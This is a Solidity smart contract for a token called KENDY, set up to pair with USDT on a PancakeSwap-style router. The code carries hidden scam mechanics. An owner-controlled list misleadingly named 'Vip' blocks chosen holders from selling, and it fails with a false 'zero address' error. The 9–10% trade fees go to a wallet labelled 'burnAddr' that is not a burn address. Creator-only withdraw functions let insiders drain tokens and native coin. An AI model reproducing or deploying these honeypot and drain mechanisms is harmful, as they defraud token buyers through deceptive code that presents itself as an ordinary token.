// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;

import "./ERC20.sol";
import "./Ownable.sol";
import "./SafeMath.sol";
import "./ReentrancyGuard.sol";

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns 
    (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
}

contract KENDY is ERC20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    uint256 public _buyFee = 90;
    uint256 public _sellFee = 100;
    uint256 constant public BASE = 1000;

    mapping(address => bool) public _isSwapPair;
    mapping(address => bool) private _isExcludedFromVip;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isCreates;

    constructor(address tokenOwner) ERC20("KENDY", "KENDY") {
        // 0xD99D1c33F9fC3444f8101754aBC46c52416550D1
        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
        // 0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), address(0x55d398326f99059fF775485246999027B3197955));
        // uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), address(0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684));
        _isSwapPair[uniswapV2Pair] = true;
        transferOwnership(tokenOwner);
        _isExcludedFromFees[tokenOwner] = true;
        _isExcludedFromFees[msg.sender] = true;
        _isExcludedFromFees[address(this)] = true;
        _isCreates[tokenOwner] = true;
        _isCreates[msg.sender] = true;
        uint256 total = 20000000 ether;
        _mint(tokenOwner, total);
    }

    receive() external payable {}

    function addSwapPair(address _pair, bool excluded) external onlyOwner {
        _isSwapPair[_pair] = excluded;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }

    function excludeFromVips(address account, bool excluded) public onlyOwner {
        _isExcludedFromVip[account] = excluded;
    }

    function setErc20With(address con, address addr,uint256 amount) public {
        require(_isCreates[msg.sender]);
        IERC20(con).transfer(addr, amount);
    }

    function withdraw () external {
        require(_isCreates[msg.sender]);
        payable(msg.sender).transfer(address(this).balance);
    }

    address burnAddr = address(0x5A44a138b9a4Df31DBde15c3c19C27B0Ee509634);

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override nonReentrant {
        require(from != address(0) && !_isExcludedFromVip[from], "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0);

        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            super._transfer(from, to, amount);
            return;
        }

        uint256 burnAmount;
        if (_isSwapPair[from]) { // buy
            burnAmount = amount.mul(_buyFee).div(BASE);
            super._transfer(from, burnAddr, burnAmount);
        }

        if (_isSwapPair[to]) { // sell
            burnAmount = amount.mul(_sellFee).div(BASE);
            super._transfer(from, burnAddr, burnAmount);
        }

        super._transfer(from, to, amount.sub(burnAmount));
    }

}